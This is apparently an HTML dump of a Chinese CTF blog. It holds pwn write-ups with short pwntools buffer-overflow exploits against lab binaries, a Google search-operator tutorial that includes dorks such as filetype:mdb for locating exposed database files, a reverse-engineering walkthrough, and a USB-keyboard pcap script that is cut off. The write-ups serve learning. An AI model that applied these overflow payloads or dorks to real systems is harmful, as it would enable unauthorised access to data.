+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">a = remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x400320</span>)</span><br><span class="line">a.sendline(poayload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="All-fi"><a href="#All-fi" class="headerlink" title="All_fi"></a>All_fi</h2><ol>
+<li><p>查看保护</p>
+<p><img src="5.png" alt="保护"></p>
+</li>
+<li><p>静调</p>
+<ol>
+<li><p><code>run</code>发现输出了<br><code>~~ welcome to ctf ~~</code><br><code>lets get helloworld for bof</code><br>然后用户输入,<code>cyclic 200</code>输入后发现,读了16个字节</p>
+</li>
+<li><p>ida打开程序 - 找到main函数,发现函数最后比较了<code>cs:dword_60106C</code>和<code>6E756161h</code>的值,如果相同的话,转入<code>sub_400686(cat flag.txt)</code>,即要让<code>cs:dword_60106C</code>等于<code>6E756161h</code></p>
+</li>
+<li><p>程序向<code>unk_601068</code>输入最多16字节的数据,查看内存,发现<code>601068</code>包含4个字节,输入16字节后可以覆盖<code>dword_60106C</code></p>
+<p>  <img src="6.png" alt="内存地址"></p>
+</li>
+<li><p>动调验证</p>
+<ol>
+<li><p>这一题开了保护,无法直接<code>break main</code></p>
+</li>
+<li><p>run以后在输入前<code>Ctrl C</code>然后ni步过,输入<code>aaaaaaun</code>(<code>&#39;a&#39;*4+p64(0x6e756161)</code>)</p>
+</li>
+<li><p>这里有比较eax和<code>0x6e756161</code>的值</p>
+<p> <img src="8.png" alt="动调"></p>
+</li>
+<li><p>查看eax</p>
+<p>  <img src="9.png" alt="eax"></p>
+</li>
+<li><p>ni步过</p>
+<p>  <img src="10.png" alt="结果"></p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p64(<span class="number">0x6e756161</span>)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/13/5-13%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/13/5-13%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">5.13刷题笔记</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-13 23:12:02 / 修改时间：23:23:06" itemprop="dateCreated datePublished" datetime="2021-05-13T23:12:02+08:00">2021-05-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/" itemprop="url" rel="index"><span itemprop="name">栈溢出</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><ul>
+<li><p>关键函数</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>这里输入了一个v1,判断了v2</p>
+</li>
+<li><p>通过11.28125在内存中,显示为0x41348000h</p>
+</li>
+<li><p>查看堆栈区,发现v1的偏移0到-30,覆盖了部分v2</p>
+</li>
+<li><p>payload</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29738</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">44</span> + p64(<span class="number">0x41348000</span>) <span class="comment"># 注意加上p64(64位程序)</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()    </span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/10/Google%E8%AF%AD%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/10/Google%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">Google语法</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-10 14:28:22 / 修改时间：16:20:12" itemprop="dateCreated datePublished" datetime="2021-05-10T14:28:22+08:00">2021-05-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
+<li>google的默认搜索时and逻辑，即输入<code>program google</code>会搜索出包含<code>program</code>和<code>google</code>的内容</li>
+<li>如果要搜索其中的任意一个,使用关键词<strong>OR</strong>,<code>program OR google</code>注意中间空一格</li>
+<li>如果不想看见<code>google</code>的内容,可以在前面加减号<code>-</code>,<code>program -google</code></li>
+<li>如果不希望搜索的内容被google自动忽略,可以在前面加上加号<code>+</code>,<code>program +google</code></li>
+<li>google搜做支持通配符填充,<code>&quot;goo*le&quot;</code>,进行模糊搜索,注意要用英文半角双括号括住</li>
+</ul>
+<h2 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h2><ul>
+<li>intitle<ul>
+<li>将搜索的范围局限在标题上,<code>intitle:xxx</code>,只会对网页的标题进行搜索并且配对,然后返回结果</li>
+<li><code>intitle:program moon</code>因为program的内容较多,moon关键词被智能忽略了,可以加上前缀<strong>all</strong>,<code>allintitle:program moon</code></li>
+</ul>
+</li>
+<li>intext<ul>
+<li>将搜索的范围局限在网页正文内容</li>
+<li><code>allintext:xxx xxx</code>同上</li>
+</ul>
+</li>
+<li>inanchor<ul>
+<li>在页面的链接锚点进行搜索</li>
+<li><code>inanchor:login</code></li>
+</ul>
+</li>
+<li>site<ul>
+<li>将搜索限制在站点域名之内</li>
+<li><code>program site:google.com</code></li>
+<li>通常不加上www,可以包含顶级域名,二级域名,三级域名</li>
+</ul>
+</li>
+<li>inurl<ul>
+<li>将搜索的范围限制在URL或者网站的页面上,可以查找搜索和帮助</li>
+<li><code>allinurl</code>同上</li>
+<li><code>site:google.com -inurl:www.google.com</code>可以搜索google有多少个子域名</li>
+</ul>
+</li>
+<li>link<ul>
+<li>查询所有链接到某个特定URL上的列表</li>
+<li><code>link:www.baidu.com</code>查看所有链接到百度主页的网页</li>
+</ul>
+</li>
+<li>cache<ul>
+<li>帮我们查找google索引过的页面副本</li>
+<li>即使源文件界面不存在了，或者变成了其它的内容，我们依然可以搜索的到。</li>
+</ul>
+</li>
+<li>fileytpe<ul>
+<li>搜索指令后缀的文件</li>
+<li><code>filetype:mdb</code>显示出一些网站的数据库文件</li>
+</ul>
+</li>
+<li>related<ul>
+<li>搜索与某些页面相关的网站</li>
+<li><code>related:www.google.com</code>会显示一些其他的搜索引擎</li>
+</ul>
+</li>
+<li>info<ul>
+<li>搜索到关于一个URL的更多信息的页面列表,包括cache,等等</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/23/4-23%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/23/4-23%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">4.23刷题笔记</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-23 15:05:13 / 修改时间：15:58:16" itemprop="dateCreated datePublished" datetime="2021-04-23T15:05:13+08:00">2021-04-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>定位关键函数(已更改)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">INT_PTR __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> chara[<span class="number">11</span>]; <span class="comment">// [esp+8h] [ebp-20030h] BYREF</span></span><br><span class="line">  CHAR String[<span class="number">65536</span>]; <span class="comment">// [esp+34h] [ebp-20004h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">65536</span>]; <span class="comment">// [esp+10034h] [ebp-10004h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chara[<span class="number">0</span>] = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">      chara[<span class="number">1</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">      chara[<span class="number">2</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">      chara[<span class="number">3</span>] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">      chara[<span class="number">4</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">      chara[<span class="number">5</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">      chara[<span class="number">6</span>] = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">      chara[<span class="number">7</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">      chara[<span class="number">8</span>] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">      chara[<span class="number">9</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">      chara[<span class="number">10</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">      encry(chara, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v9[<span class="number">0</span>] = String[<span class="number">5</span>];</span><br><span class="line">      v9[<span class="number">2</span>] = String[<span class="number">7</span>];</span><br><span class="line">      v9[<span class="number">1</span>] = String[<span class="number">6</span>];</span><br><span class="line">      v4 = sub_401000(v9, <span class="built_in">strlen</span>(v9));</span><br><span class="line">      <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v9[<span class="number">1</span>] = String[<span class="number">3</span>];</span><br><span class="line">      v9[<span class="number">0</span>] = String[<span class="number">2</span>];</span><br><span class="line">      v9[<span class="number">2</span>] = String[<span class="number">4</span>];</span><br><span class="line">      v5 = sub_401000(v9, <span class="built_in">strlen</span>(v9));</span><br><span class="line">      <span class="keyword">if</span> ( String[<span class="number">0</span>] == chara[<span class="number">0</span>] + <span class="number">34</span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == chara[<span class="number">4</span>]</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * chara[<span class="number">2</span>]</span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (chara[<span class="number">7</span>] / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 != <span class="number">1</span> &amp;&amp; a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到chara里放了一串字符串,然后通过encry函数变换,最后在if语句中与另外两个字符串做比较<br>根据string可以看出flag有八个字符</p>
+<p>跟入encry函数，可以看出这里是一个递归的冒泡排序，<code>encry(character, begin, i - 1)</code>这里有一个递归调用,插入排序,中间其他的if语句都是判断越界的语句</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">encry</span><span class="params">(<span class="keyword">int</span> character, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> CHAR; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = end;</span><br><span class="line">  <span class="keyword">for</span> ( i = begin; i &lt;= end; begin = i )</span><br><span class="line">  &#123;</span><br><span class="line">    j = <span class="number">4</span> * i;                                  <span class="comment">// 整型的大小为4字节</span></span><br><span class="line">    CHAR = *(<span class="number">4</span> * i + character);</span><br><span class="line">    <span class="keyword">if</span> ( begin &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( CHAR &gt; *(character + <span class="number">4</span> * result) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          *(j + character) = *(character + <span class="number">4</span> * result);</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(character + <span class="number">4</span> * i) &lt;= CHAR )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          j = <span class="number">4</span> * i;</span><br><span class="line">          *(character + <span class="number">4</span> * result) = *(<span class="number">4</span> * i + character);</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    *(character + <span class="number">4</span> * result) = CHAR;</span><br><span class="line">    encry(character, begin, i - <span class="number">1</span>);</span><br><span class="line">    result = end;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/22/ppsuc%E6%A0%A1%E5%86%85%E8%B5%9Bwp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/22/ppsuc%E6%A0%A1%E5%86%85%E8%B5%9Bwp/" class="post-title-link" itemprop="url">ppsuc校内赛wp</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-22 08:15:03 / 修改时间：08:35:54" itemprop="dateCreated datePublished" datetime="2021-04-22T08:15:03+08:00">2021-04-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/competition/" itemprop="url" rel="index"><span itemprop="name">competition</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/competition/ppsuc/" itemprop="url" rel="index"><span itemprop="name">ppsuc</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>两个包,一个是pcap文件,一个是txt:<code>flag以数字方式提交</code><br>wireshark打开pcap文件</p>
+<p><img src="wireshark.png" alt="wireshark"></p>
+<p>有很多usb的中断，看<code>Leftover Capture Data</code>的字节数,可以判断是键盘输入还是鼠标,这里是键盘</p>
+<p>脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;tshark -r 1.pcap -T fields -e usb.capdata &gt; usbdata.txt&quot;</span>)</span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span 